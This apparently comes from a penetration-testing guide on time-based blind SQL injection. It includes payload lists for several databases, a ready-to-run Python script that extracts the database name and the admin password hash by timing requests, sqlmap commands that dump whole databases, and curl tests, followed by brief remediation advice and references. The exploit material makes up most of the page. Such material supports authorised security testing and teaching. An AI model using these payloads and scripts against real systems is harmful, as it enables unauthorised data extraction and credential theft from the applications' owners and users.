# SQL Injection Blind Time-based

## Overview
Time-based blind SQL injection exploits a vulnerable query by injecting conditional time-delay functions into SQL payloads. When the application returns identical responses regardless of query outcome (no boolean oracle), an attacker uses database-specific sleep functions to infer whether an injected condition is true or false based on how long the server takes to respond. It is the stealthiest form of SQL injection and requires patience — extracting a single string can take hundreds of timed requests — but works even against applications with complete output suppression.

## How It Works
- The attacker injects a payload like: `1; IF(1=1, SLEEP(5), SLEEP(0))--`
- If the server response takes ~5 seconds, the condition (1=1) is TRUE.
- If it responds immediately, the condition is FALSE.
- The attacker constructs precise binary questions: `IF(ASCII(SUBSTRING(database(),1,1))>64, SLEEP(3), SLEEP(0))`
- By measuring response time for each character position and each possible ASCII range, all data is extracted.
- Network jitter is managed by using consistent delay thresholds and averaging multiple measurements.
- Each database vendor has its own time-delay function: `SLEEP(n)` (MySQL), `WAITFOR DELAY` (MSSQL), `pg_sleep(n)` (PostgreSQL), `dbms_pipe.receive_message` (Oracle).

## Impact
- All data in the database is extractable, identical to other SQLi forms.
- Works even when the application shows the same page for all inputs.
- Difficult to detect in logs (looks like slow network, not an attack).
- Can bypass WAFs that block error patterns but not sleep-based payloads.
- Works through all abstraction layers, including ORMs that pass raw filter strings.

## Where to Look
- All user-controlled parameters in GET and POST requests.
- Search boxes, filters, sort parameters, pagination inputs.
- REST API endpoints with numeric or string path/query parameters.
- JSON API bodies: `{"filter": "1"}`.
- HTTP headers accepted by query logic: `X-Forwarded-For`, `User-Agent`, `Referer`.
- Any endpoint where injection did not trigger a boolean oracle but you suspect SQLi.

## Testing Steps
1. Inject a basic time-delay payload and measure response time:
   - MySQL: `1 AND SLEEP(5)--`
   - MSSQL: `1; WAITFOR DELAY '0:0:5'--`
   - PostgreSQL: `1; SELECT pg_sleep(5)--`
   - Oracle: `1 AND dbms_pipe.receive_message('x',5)=1--`
2. Confirm the delay is consistent and reproducible by sending the same payload 3 times.
3. Verify the delay is conditional: `IF(1=2,SLEEP(5),SLEEP(0))` should NOT delay.
4. Establish a reliable time threshold (e.g., >3 seconds = TRUE, <0.5 seconds = FALSE).
5. Extract database name length: `IF(LENGTH(database())=5,SLEEP(3),SLEEP(0))`
6. Extract characters using binary search: `IF(ASCII(SUBSTRING(database(),1,1))>80,SLEEP(3),SLEEP(0))`
7. Repeat for each character position until complete string is extracted.
8. Use sqlmap with `--technique=T` to automate extraction.
9. Monitor server response times carefully — network latency can cause false positives.
10. Document evidence: timestamps of requests, observed delays, extracted data.

## Payloads / Techniques

```sql
-- Time delay detection payloads
-- MySQL
1 AND SLEEP(5)--
' AND SLEEP(5)--
1' AND SLEEP(5)--
") AND SLEEP(5)--

-- MySQL conditional delay
' AND IF(1=1,SLEEP(5),SLEEP(0))--         -- Should delay 5s (TRUE)
' AND IF(1=2,SLEEP(5),SLEEP(0))--         -- Should NOT delay (FALSE)

-- MSSQL
1; WAITFOR DELAY '0:0:5'--
' WAITFOR DELAY '0:0:5'--
'; WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
1; SELECT pg_sleep(5)--
'; SELECT pg_sleep(5)--
' AND (SELECT pg_sleep(5))--
' AND 1=(SELECT 1 FROM pg_sleep(5))--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--
' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--

-- SQLite
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--

-- MySQL Data extraction with time
-- Extract database name (binary search on ASCII value)
' AND IF(ASCII(SUBSTRING(database(),1,1))>80,SLEEP(3),SLEEP(0))--    -- >80? (P=80)
' AND IF(ASCII(SUBSTRING(database(),1,1))>72,SLEEP(3),SLEEP(0))--    -- >72?
' AND IF(ASCII(SUBSTRING(database(),1,1))=109,SLEEP(3),SLEEP(0))--   -- =109 ('m')?

-- Extract first table name
' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>64,SLEEP(3),SLEEP(0))--

-- Extract admin password hash
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>36,SLEEP(3),SLEEP(0))--
```

```python
import requests
import time

BASE = "https://target.com"
DELAY_THRESHOLD = 3  # seconds

def time_oracle(payload, expected_delay=5):
    """Returns True if response is delayed (condition is TRUE)."""
    start = time.time()
    try:
        requests.get(f"{BASE}/item", params={"id": payload}, timeout=expected_delay + 5)
    except requests.exceptions.Timeout:
        return True  # Definitely delayed
    elapsed = time.time() - start
    return elapsed >= DELAY_THRESHOLD

def extract_string_time(query, max_len=50, delay=3):
    """Extract string using time-based binary search."""
    result = ""
    
    for pos in range(1, max_len + 1):
        lo, hi = 32, 127
        
        while lo < hi:
            mid = (lo + hi) // 2
            payload = (
                f"1 AND IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid},"
                f"SLEEP({delay}),SLEEP(0))--"
            )
            if time_oracle(payload, expected_delay=delay):
                lo = mid + 1
            else:
                hi = mid
        
        if lo <= 32:
            break
        
        char = chr(lo)
        result += char
        print(f"[+] Position {pos}: '{char}' -> Current: '{result}'")
    
    return result

# Test time-based injection
print("[*] Testing time-based injection...")
test_payload = "1 AND IF(1=1,SLEEP(4),SLEEP(0))--"
if time_oracle(test_payload, expected_delay=4):
    print("[+] TIME-BASED SQL INJECTION CONFIRMED!")
    
    db = extract_string_time("SELECT database()")
    print(f"\n[+] Database name: {db}")
    
    admin_pass = extract_string_time(
        f"SELECT password FROM users WHERE username='admin'"
    )
    print(f"[+] Admin password hash: {admin_pass}")
else:
    print("[-] No time delay detected")
```

```bash
# sqlmap automated time-based extraction
sqlmap -u "https://target.com/item?id=1" \
  --technique=T \
  --dbms=mysql \
  --dbs \
  --batch \
  --time-sec=5

# POST request
sqlmap -u "https://target.com/search" \
  --data="query=test" \
  --technique=T \
  -p query \
  --dbs \
  --batch

# Extract specific table data
sqlmap -u "https://target.com/item?id=1" \
  --technique=T \
  -D webapp \
  -T users \
  --dump \
  --batch

# Increase threads for faster extraction
sqlmap -u "https://target.com/item?id=1" \
  --technique=T \
  --threads=5 \
  --dump-all \
  --batch

# MSSQL time-based
sqlmap -u "https://target.com/item?id=1" \
  --technique=T \
  --dbms=mssql \
  -D master \
  --tables \
  --batch
```

```bash
# Manual time-based test with curl
time curl -si "https://target.com/item?id=1%20AND%20SLEEP(5)--" > /dev/null
# real  0m5.123s -> VULNERABLE
# real  0m0.045s -> No delay (not vulnerable or payload rejected)

# Conditional delay test
time curl -si "https://target.com/item?id=1%20AND%20IF(1=1,SLEEP(5),SLEEP(0))--" > /dev/null
time curl -si "https://target.com/item?id=1%20AND%20IF(1=2,SLEEP(5),SLEEP(0))--" > /dev/null
# First should be ~5s, second ~0s
```

## Burp Suite Tips
- **Intruder with Response Time Column**: Configure Intruder to run character-by-character payloads. Add "Response received" column in the attack results — sort by response time to identify TRUE (delayed) vs FALSE (fast) responses.
- **Repeater — Response Timer**: Burp Repeater shows response time at the bottom of each response — use this to manually confirm time delays without external tools.
- **Extender — SQLiPy**: Right-click the vulnerable request in Proxy > Send to SQLMap (requires SQLiPy plugin) — runs sqlmap including time-based techniques automatically.
- **Active Scanner**: Burp's scanner will attempt time-based payloads and report findings with evidence of delay observed.
- **Project Options — Timeout**: Set a longer request timeout in Project Options > Connections if time-based payloads with longer delays are timing out before sqlmap or Intruder captures the full response.

## Tools
- **sqlmap** — `--technique=T` for time-based only; gold standard for automated extraction.
- **BBQSQL** — custom time-based extraction with configurable oracle.
- **Burp Suite Intruder** — semi-manual extraction with response time analysis.
- **Havij** — GUI tool with time-based mode.
- **Python requests** — precise timing with custom binary search scripts.
- **Turbo Intruder** — for high-speed time-based testing (adjust concurrency carefully to avoid false positives).

## Remediation
- Parameterized queries / prepared statements — the definitive fix.
- Input validation and strict type enforcement.
- Set appropriate query timeouts at the database connection level to limit sleep-based attacks.
- Monitor for abnormally slow query response times — may indicate time-based injection in progress.
- WAF rules targeting `SLEEP`, `WAITFOR`, `pg_sleep`, `DBMS_PIPE` in SQL context.
- Implement rate limiting to reduce the speed at which character-by-character extraction can proceed.

## References
https://portswigger.net/web-security/sql-injection/blind
https://owasp.org/www-community/attacks/Blind_SQL_Injection
https://github.com/sqlmapproject/sqlmap
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/89.html
